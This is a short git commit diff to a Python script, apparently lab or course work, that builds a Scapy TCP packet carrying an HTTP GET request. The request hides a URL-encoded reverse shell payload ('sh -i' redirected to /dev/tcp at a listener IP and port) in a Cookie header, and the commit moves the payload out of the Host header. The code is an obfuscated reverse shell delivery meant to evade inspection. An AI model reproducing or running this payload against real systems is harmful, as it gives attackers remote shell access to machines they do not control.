ed78f3d75cd63405b95fccb36e19dfba7c19f2f3
Kanskikuro <william.vo@live.no>
2024-11-13 13:17:50 +0100

    Update and rename obfuscated_packets.py to payload_obfuscation.py

--- payload_obfuscation.py
+++ payload_obfuscation.py
@@ -7,7 +7,7 @@ reverse_shell_payload = b'sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.50.224%2F900
 
 packet = IP(dst=target_ip)/TCP(dport=target_port)/(
     b"GET /index.html HTTP/1.1\r\n" +
-    b"Host: sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.50.224%2F9001%200%3E%261\r\n" +
+    b"Host: uis.no\r\n" +
     b"Cookie: sessionid=1234; shell_payload=" + reverse_shell_payload + b"\r\n" +
     b"\r\n"
 )
